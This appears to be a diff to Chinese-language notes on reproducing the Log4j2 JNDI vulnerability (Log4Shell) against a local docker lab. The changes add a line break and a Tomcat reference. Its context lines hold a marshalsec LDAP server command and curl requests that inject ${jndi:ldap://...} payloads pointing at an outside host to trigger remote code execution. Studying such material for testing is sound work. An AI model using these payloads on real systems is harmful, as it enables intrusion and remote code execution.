@@ -68,6 +68,7 @@ java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http
 docker run --rm --name log4jpwn -p8080:8080 log4jpwn
 
 curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/a}' 'localhost:8080/${jndi:ldap://172.29.78.192:1389/a}/?pwn=$\{jndi:ldap://172.29.78.192:1389/a\}'
+
 curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCELinux}' 'localhost:8080'
 curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8080'
 172.17.0.2
@@ -320,6 +321,10 @@ https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot
   信息泄漏不允许访问Elasticsearch集群中的数据。 
   我们还将发布一个新版本的Elasticsearch，该版本默认包含JVM属性，为了谨慎起见，它删除了Log4j的某些组件。 
 
+### tomcat
+
+https://tomcat.apache.org/tomcat-8.0-doc/logging.html#Using_Log4j
+tomcat 默认不使用log4j2
 
 ### 其它参考
 
